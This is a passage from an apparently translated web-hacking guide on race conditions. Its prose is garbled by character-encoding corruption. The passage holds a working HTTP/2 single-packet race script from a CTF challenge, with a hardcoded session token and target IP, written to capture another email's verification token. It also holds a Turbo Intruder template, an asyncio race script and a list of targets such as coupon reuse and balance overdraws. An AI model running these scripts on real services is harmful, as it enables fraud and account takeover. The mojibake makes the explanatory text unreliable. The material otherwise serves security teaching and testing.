* **Automated python script**: ÎŸ ÏƒÏ„ÏŒÏ‡Î¿Ï‚ Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… script ÎµÎ¯Î½Î±Î¹ Î½Î± Î±Î»Î»Î¬Î¾ÎµÎ¹ Ï„Î¿ email ÎµÎ½ÏŒÏ‚ Ï‡ÏÎ®ÏƒÏ„Î· ÎµÎ½Ï ÏƒÏ…Î½ÎµÏ‡ÏÏ‚ Ï„Î¿ ÎµÏ€Î±Î»Î·Î¸ÎµÏÎµÎ¹ Î¼Î­Ï‡ÏÎ¹ Î½Î± Ï†Ï„Î¬ÏƒÎµÎ¹ Ï„Î¿ verification token Ï„Î¿Ï… Î½Î­Î¿Ï… email ÏƒÏ„Î¿ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î¿ email (Î±Ï…Ï„ÏŒ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÎµÏ€ÎµÎ¹Î´Î® ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï€Î±ÏÎ±Ï„Î·ÏÎ®Î¸Î·ÎºÎµ Î¼Î¹Î± RC ÏŒÏ€Î¿Ï… Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î­Î½Î± email Î±Î»Î»Î¬ Î½Î± ÏƒÏ„Î±Î»ÎµÎ¯ Î· ÎµÏ€Î±Î»Î®Î¸ÎµÏ…ÏƒÎ· ÏƒÏ„Î¿ Ï€Î±Î»Î¹ÏŒ ÎµÏ€ÎµÎ¹Î´Î® Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Ï€Î¿Ï… Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ Ï„Î¿ email Î®Ï„Î±Î½ Î®Î´Î· Î³ÎµÎ¼Î¬Ï„Î· Î¼Îµ Ï„Î¿ Ï€ÏÏÏ„Î¿).\
ÎŒÏ„Î±Î½ Î· Î»Î­Î¾Î· "objetivo" Î²ÏÎµÎ¸ÎµÎ¯ ÏƒÏ„Î± Î»Î·Ï†Î¸Î­Î½Ï„Î± emails, Î³Î½Ï‰ÏÎ¯Î¶Î¿Ï…Î¼Îµ ÏŒÏ„Î¹ Î»Î¬Î²Î±Î¼Îµ Ï„Î¿ verification token Ï„Î¿Ï… Î±Î»Î»Î¬Î³Î¼Î­Î½Î¿Ï… email ÎºÎ±Î¹ Ï„ÎµÏÎ¼Î±Ï„Î¯Î¶Î¿Ï…Î¼Îµ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ·.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Î’ÎµÎ»Ï„Î¯Ï‰ÏƒÎ· Î•Ï€Î¯Î¸ÎµÏƒÎ·Ï‚ ÎœÎ¿Î½Î±Î´Î¹ÎºÎ¿Ï Î Î±ÎºÎ­Ï„Î¿Ï…

Î£Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® Î­ÏÎµÏ…Î½Î± ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î¹ Î±Ï…Ï„Î® Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î­Ï‡ÎµÎ¹ ÏŒÏÎ¹Î¿ 1,500 bytes. Î©ÏƒÏ„ÏŒÏƒÎ¿, ÏƒÎµ [**Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ·**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), ÎµÎ¾Î·Î³Î®Î¸Î·ÎºÎµ Ï€ÏÏ‚ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÏ€ÎµÎºÏ„Î±Î¸ÎµÎ¯ Î¿ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏŒÏ‚ Ï„Ï‰Î½ 1,500 bytes Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ Î¼Î¿Î½Î±Î´Î¹ÎºÎ¿Ï Ï€Î±ÎºÎ­Ï„Î¿Ï… ÏƒÏ„Î¿ **65,535 B Ï€Î±ÏÎ¬Î¸Ï…ÏÎ¿ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î¿Ï Ï„Î¿Ï… TCP Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÎºÎ±Ï„Î±ÎºÎµÏÎ¼Î±Ï„Î¹ÏƒÎ¼ÏŒ ÎµÏ€Î¹Ï€Î­Î´Î¿Ï… IP** (Î´Î¹Î±Ï‡Ï‰ÏÎ¹ÏƒÎ¼ÏŒÏ‚ ÎµÎ½ÏŒÏ‚ Î¼Î¿Î½Î±Î´Î¹ÎºÎ¿Ï Ï€Î±ÎºÎ­Ï„Î¿Ï… ÏƒÎµ Ï€Î¿Î»Î»Î±Ï€Î»Î¬ Ï€Î±ÎºÎ­Ï„Î± IP) ÎºÎ±Î¹ ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î¬Ï‚ Ï„Î± ÏƒÎµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ® ÏƒÎµÎ¹ÏÎ¬, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±Ï€Î¿Ï†Ï…Î³Î® Î±Î½Î±ÏƒÏÎ½Î¸ÎµÏƒÎ·Ï‚ Ï„Î¿Ï… Ï€Î±ÎºÎ­Ï„Î¿Ï… Î¼Î­Ï‡ÏÎ¹ Î½Î± Ï†Ï„Î¬ÏƒÎ¿Ï…Î½ ÏŒÎ»Î± Ï„Î± Î¸ÏÎ±ÏÏƒÎ¼Î±Ï„Î± ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®. Î‘Ï…Ï„Î® Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ® ÎµÏ€Î­Ï„ÏÎµÏˆÎµ ÏƒÏ„Î¿Î½ ÎµÏÎµÏ…Î½Î·Ï„Î® Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ 10,000 Î±Î¹Ï„Î®Î¼Î±Ï„Î± ÏƒÎµ Ï€ÎµÏÎ¯Ï€Î¿Ï… 166ms.&#x20;

Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Î½ ÎºÎ±Î¹ Î±Ï…Ï„Î® Î· Î²ÎµÎ»Ï„Î¯Ï‰ÏƒÎ· ÎºÎ±Î¸Î¹ÏƒÏ„Î¬ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· Ï€Î¹Î¿ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î· ÏƒÎµ RC Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„ÎµÎ¯ ÎµÎºÎ±Ï„Î¿Î½Ï„Î¬Î´ÎµÏ‚/Ï‡Î¹Î»Î¹Î¬Î´ÎµÏ‚ Ï€Î±ÎºÎ­Ï„Î± Î½Î± Ï†Ï„Î¬ÏƒÎ¿Ï…Î½ Ï„Î±Ï…Ï„ÏŒÏ‡ÏÎ¿Î½Î±, Î¼Ï€Î¿ÏÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î­Ï‡ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹Î¿Ï…Ï‚ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î¿ÏÏ‚ Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¿Ï. ÎŸÏÎ¹ÏƒÎ¼Î­Î½Î¿Î¹ Î´Î·Î¼Î¿Ï†Î¹Î»ÎµÎ¯Ï‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚ HTTP ÏŒÏ€Ï‰Ï‚ Î¿Î¹ Apache, Nginx ÎºÎ±Î¹ Go Î­Ï‡Î¿Ï…Î½ Î±Ï…ÏƒÏ„Î·ÏÎ® ÏÏÎ¸Î¼Î¹ÏƒÎ· `SETTINGS_MAX_CONCURRENT_STREAMS` ÏƒÎµ 100, 128 ÎºÎ±Î¹ 250. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î¬Î»Î»Î¿Î¹ ÏŒÏ€Ï‰Ï‚ Î¿Î¹ NodeJS ÎºÎ±Î¹ nghttp2 Ï„Î¿ Î­Ï‡Î¿Ï…Î½ Î±Ï€ÎµÏÎ¹ÏŒÏÎ¹ÏƒÏ„Î¿.\
Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ Î²Î±ÏƒÎ¹ÎºÎ¬ ÏŒÏ„Î¹ Î¿ Apache Î¸Î± ÎµÎ¾ÎµÏ„Î¬ÏƒÎµÎ¹ Î¼ÏŒÎ½Î¿ 100 HTTP ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚ Î±Ï€ÏŒ Î¼Î¹Î± Î¼Î¿Î½Î±Î´Î¹ÎºÎ® TCP ÏƒÏÎ½Î´ÎµÏƒÎ· (Ï€ÎµÏÎ¹Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· RC).

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î¼ÎµÏÎ¹ÎºÎ¬ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„Î® Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ® ÏƒÏ„Î¿ Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Î‘ÎºÎ±Ï„Î­ÏÎ³Î±ÏƒÏ„Î¿ BF

Î ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· Î­ÏÎµÏ…Î½Î±, Î±Ï…Ï„Î¬ Î®Ï„Î±Î½ Î¼ÎµÏÎ¹ÎºÎ¬ payloads Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎ±Î½ ÎºÎ±Î¹ Î±Ï€Î»ÏÏ‚ Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î¿ÏÏƒÎ±Î½ Î½Î± ÏƒÏ„ÎµÎ¯Î»Î¿Ï…Î½ Ï„Î± Ï€Î±ÎºÎ­Ï„Î± ÏŒÏƒÎ¿ Ï„Î¿ Î´Ï…Î½Î±Ï„ÏŒÎ½ Ï€Î¹Î¿ Î³ÏÎ®Î³Î¿ÏÎ± Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î½ Î¼Î¹Î± RC.

* **Î•Ï€Î±Î½Î±Î»Î®Ï€Ï„Î·Ï‚:** Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Î±Ï€ÏŒ Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î±.
* **Î•Î¹ÏƒÎ²Î¿Î»Î­Î±Ï‚**: Î£Ï„ÎµÎ¯Î»Ï„Îµ Ï„Î¿ **Î±Î¯Ï„Î·Î¼Î±** ÏƒÏ„Î¿Î½ **Î•Î¹ÏƒÎ²Î¿Î»Î­Î±**, ÏÏ…Î¸Î¼Î¯ÏƒÏ„Îµ Ï„Î¿Î½ **Î±ÏÎ¹Î¸Î¼ÏŒ Î½Î·Î¼Î¬Ï„Ï‰Î½** ÏƒÎµ **30** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ **Î¼ÎµÎ½Î¿Ï Î•Ï€Î¹Î»Î¿Î³ÏÎ½** ÎºÎ±Î¹ ÎµÏ€Î¹Î»Î­Î¾Ï„Îµ Ï‰Ï‚ payload **Null payloads** ÎºÎ±Î¹ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ **30.**
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

Î‘Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ Ï€Î¹Î¿ Î²Î±ÏƒÎ¹ÎºÏŒÏ‚ Ï„ÏÏ€Î¿Ï‚ ÏƒÏ…Î½Î¸Î®ÎºÎ·Ï‚ Î±Î³ÏÎ½Î± ÏŒÏ€Î¿Ï… **ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚** Ï€Î¿Ï… **ÎµÎ¼Ï†Î±Î½Î¯Î¶Î¿Î½Ï„Î±Î¹** ÏƒÎµ Î¼Î­ÏÎ· Ï€Î¿Ï… **Ï€ÎµÏÎ¹Î¿ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î¿Î½ Î±ÏÎ¹Î¸Î¼ÏŒ Ï„Ï‰Î½ Ï†Î¿ÏÏÎ½ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÎ½Î­ÏÎ³ÎµÎ¹Î±**. ÎŒÏ€Ï‰Ï‚ Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… Î¯Î´Î¹Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï Î­ÎºÏ€Ï„Ï‰ÏƒÎ·Ï‚ ÏƒÎµ Î­Î½Î± Î´Î¹Î±Î´Î¹ÎºÏ„Ï…Î±ÎºÏŒ ÎºÎ±Ï„Î¬ÏƒÏ„Î·Î¼Î± Ï€Î¿Î»Î»Î­Ï‚ Ï†Î¿ÏÎ­Ï‚. ÎˆÎ½Î± Ï€Î¿Î»Ï ÎµÏÎºÎ¿Î»Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ ÏƒÎµ [**Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î±Ï†Î¿ÏÎ¬**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) Î® ÏƒÎµ [**Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÏ†Î¬Î»Î¼Î±**](https://hackerone.com/reports/759247)**.**

Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ Ï€Î¿Î»Î»Î­Ï‚ Ï€Î±ÏÎ±Î»Î»Î±Î³Î­Ï‚ Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… ÎµÎ¯Î´Î¿Ï…Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚, ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Ï‰Î½:

* Î•Î¾Î±ÏÎ³ÏÏÏ‰ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î´ÏÏÎ¿Ï… Ï€Î¿Î»Î»Î­Ï‚ Ï†Î¿ÏÎ­Ï‚
* Î‘Î¾Î¹Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎµÎ½ÏŒÏ‚ Ï€ÏÎ¿ÏŠÏŒÎ½Ï„Î¿Ï‚ Ï€Î¿Î»Î»Î­Ï‚ Ï†Î¿ÏÎ­Ï‚
* Î‘Î½Î¬Î»Î·ÏˆÎ· Î® Î¼ÎµÏ„Î±Ï†Î¿ÏÎ¬ Ï‡ÏÎ·Î¼Î¬Ï„Ï‰Î½ Ï€Î­ÏÎ± Î±Ï€ÏŒ Ï„Î¿ Ï…Ï€ÏŒÎ»Î¿Î¹Ï€Î¿ Ï„Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï ÏƒÎ±Ï‚
* Î•Ï€Î±Î½Î±Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î¼Î¹Î±Ï‚ Î¼ÏŒÎ½Î¿ Î»ÏÏƒÎ·Ï‚ CAPTCHA
* Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· ÎµÎ½ÏŒÏ‚ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î¿Ï ÏÏ…Î¸Î¼Î¿Ï ÎºÎ±Ï„Î¬ Ï„Î·Ï‚ Î²Î¯Î±Î¹Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚

### **Hidden substates**

Î— ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÏƒÏÎ½Î¸ÎµÏ„Ï‰Î½ ÏƒÏ…Î½Î¸Î·ÎºÏÎ½ Î±Î³ÏÎ½Î± ÏƒÏ…Ï‡Î½Î¬ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÏƒÏÎ½Ï„Î¿Î¼Ï‰Î½ ÎµÏ…ÎºÎ±Î¹ÏÎ¹ÏÎ½ Î³Î¹Î± Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Î¼Îµ ÎºÏÏ…Ï†Î­Ï‚ Î® **Î¼Î· Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï…Ï€Î¿ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÎ¹Ï‚ Î¼Î·Ï‡Î±Î½Î®Ï‚**. ÎÎ± Ï€ÏÏ‚ Î½Î± Ï€ÏÎ¿ÏƒÎµÎ³Î³Î¯ÏƒÎµÏ„Îµ Î±Ï…Ï„ÏŒ:

1. **Î•Î½Ï„Î¿Ï€Î¯ÏƒÏ„Îµ Î Î¹Î¸Î±Î½Î­Ï‚ ÎšÏÏ…Ï†Î­Ï‚ Î¥Ï€Î¿ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÎ¹Ï‚**
* ÎÎµÎºÎ¹Î½Î®ÏƒÏ„Îµ ÎµÎ½Ï„Î¿Ï€Î¯Î¶Î¿Î½Ï„Î±Ï‚ ÏƒÎ·Î¼ÎµÎ¯Î± Ï€Î¿Ï… Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î¿ÏÎ½ Î® Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¿ÏÎ½ Î¼Îµ ÎºÏÎ¯ÏƒÎ¹Î¼Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±, ÏŒÏ€Ï‰Ï‚ Ï€ÏÎ¿Ï†Î¯Î» Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Î® Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚. Î•Ï€Î¹ÎºÎµÎ½Ï„ÏÏ‰Î¸ÎµÎ¯Ï„Îµ ÏƒÎµ:
* **Î‘Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ·**: Î ÏÎ¿Ï„Î¹Î¼Î®ÏƒÏ„Îµ ÏƒÎ·Î¼ÎµÎ¯Î± Ï€Î¿Ï… Ï‡ÎµÎ¹ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î¼ÏŒÎ½Î¹Î¼Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÏƒÎµ ÏƒÏ‡Î­ÏƒÎ· Î¼Îµ Î±Ï…Ï„Î¬ Ï€Î¿Ï… Ï‡ÎµÎ¹ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÏ„Î¿Î½ Ï€ÎµÎ»Î¬Ï„Î·.
* **Î•Î½Î­ÏÎ³ÎµÎ¹Î±**: Î‘Î½Î±Î¶Î·Ï„Î®ÏƒÏ„Îµ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ Ï€Î¿Ï… Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï…Ï€Î¬ÏÏ‡Î¿Î½Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±, Î¿Î¹ Î¿Ï€Î¿Î¯ÎµÏ‚ ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¿ Ï€Î¹Î¸Î±Î½ÏŒ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î½ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎ¹Î¼ÎµÏ‚ ÏƒÏ…Î½Î¸Î®ÎºÎµÏ‚ ÏƒÎµ ÏƒÏÎ³ÎºÏÎ¹ÏƒÎ· Î¼Îµ Î±Ï…Ï„Î­Ï‚ Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÎ¸Î­Ï„Î¿Ï…Î½ Î½Î­Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±.
* **ÎšÎ»ÎµÎ¹Î´ÏÎ¼Î±Ï„Î±**: ÎŸÎ¹ ÎµÏ€Î¹Ï„Ï…Ï‡ÎµÎ¯Ï‚ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ Ï€Î¿Ï… Î²Î±ÏƒÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ Î¯Î´Î¹Î¿ Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ, Ï€.Ï‡., ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· Î® Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚.
2. **Î”Î¹ÎµÎ¾Î¬Î³ÎµÏ„Îµ Î‘ÏÏ‡Î¹ÎºÎ® Î”Î¿ÎºÎ¹Î¼Î®**
* Î”Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ Ï„Î± ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼Î­Î½Î± ÏƒÎ·Î¼ÎµÎ¯Î± Î¼Îµ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ ÏƒÏ…Î½Î¸Î®ÎºÎ·Ï‚ Î±Î³ÏÎ½Î±, Ï€Î±ÏÎ±Ï„Î·ÏÏÎ½Ï„Î±Ï‚ Ï„Ï…Ï‡ÏŒÎ½ Î±Ï€Î¿ÎºÎ»Î¯ÏƒÎµÎ¹Ï‚ Î±Ï€ÏŒ Ï„Î¹Ï‚ Î±Î½Î±Î¼ÎµÎ½ÏŒÎ¼ÎµÎ½ÎµÏ‚ ÎµÎºÎ²Î¬ÏƒÎµÎ¹Ï‚. Î‘Ï€ÏÎ¿ÏƒÎ´ÏŒÎºÎ·Ï„ÎµÏ‚ Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ Î® Î±Î»Î»Î±Î³Î­Ï‚ ÏƒÏ„Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬ Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï…Ï€Î¿Î´Î·Î»ÏÎ½Î¿Ï…Î½ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±.
3. **Î”ÎµÎ¯Î¾Ï„Îµ Ï„Î·Î½ Î•Ï…Ï€Î¬Î¸ÎµÎ¹Î±**
